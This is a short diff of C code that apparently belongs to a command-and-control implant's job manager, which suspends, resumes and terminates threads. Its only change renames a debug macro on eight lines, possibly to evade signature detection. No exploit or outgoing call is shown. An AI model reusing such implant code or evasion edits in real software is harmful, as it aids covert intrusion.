@@ -109,7 +109,7 @@ VOID JobCheckList()
 
                     if ( Status != STILL_ACTIVE )
                     {
-                        PUTS( "Tracking process is dead." )
+                        STUP( "Tracking process is dead." )
                         JobList->State = JOB_STATE_DEAD;
                         AnonPipesRead( ( ( PANONPIPE ) JobList->Data ), JobList->RequestID );
 
@@ -193,7 +193,7 @@ BOOL JobSuspend( DWORD JobID )
 
             if ( JobList->Type == JOB_TYPE_THREAD )
             {
-                PUTS( "Suspending Thread" )
+                STUP( "Suspending Thread" )
                 HANDLE   Handle   = JobList->Handle;
                 NTSTATUS NtStatus = STATUS_SUCCESS;
 
@@ -209,7 +209,7 @@ BOOL JobSuspend( DWORD JobID )
                 }
                 else
                 {
-                    PUTS( "Handle is empty" )
+                    STUP( "Handle is empty" )
                     return FALSE;
                 }
             }
@@ -239,7 +239,7 @@ BOOL JobResume( DWORD JobID )
 
             if ( JobList->Type == JOB_TYPE_THREAD )
             {
-                PUTS( "Resume Thread" )
+                STUP( "Resume Thread" )
                 HANDLE   Handle   = JobList->Handle;
                 NTSTATUS NtStatus = STATUS_SUCCESS;
 
@@ -256,7 +256,7 @@ BOOL JobResume( DWORD JobID )
                 }
                 else
                 {
-                    PUTS( "Handle is empty" )
+                    STUP( "Handle is empty" )
                     return FALSE;
                 }
             }
@@ -292,12 +292,12 @@ BOOL JobKill( DWORD JobID )
                 {
                     if ( JobList->State != JOB_STATE_DEAD )
                     {
-                        PUTS( "Kill Thread" )
+                        STUP( "Kill Thread" )
                         NTSTATUS NtStatus = STATUS_SUCCESS;
 
                         if ( JobList->Handle )
                         {
-                            PUTS( "Kill using handle" )
+                            STUP( "Kill using handle" )
 
                             if ( ! NT_SUCCESS( NtStatus = Instance->Win32.NtTerminateThread( JobList->Handle, STATUS_SUCCESS ) ) )
                             {
@@ -314,7 +314,7 @@ BOOL JobKill( DWORD JobID )
                         }
                         else
                         {
-                            PUTS( "Handle is empty" )
+                            STUP( "Handle is empty" )
                             Success = FALSE;
                         }
                     }
@@ -384,7 +384,7 @@ VOID JobRemove( DWORD JobID )
 {
     // Iterate over Job list and replace/remove job
     PRINTF( "Remove JobID: %d\n", JobID );
-    PUTS( "Iterate over Job list and replace/remove job" )
+    STUP( "Iterate over Job list and replace/remove job" )
     PJOB_DATA JobList     = NULL;
     PJOB_DATA JobToRemove = NULL;
 
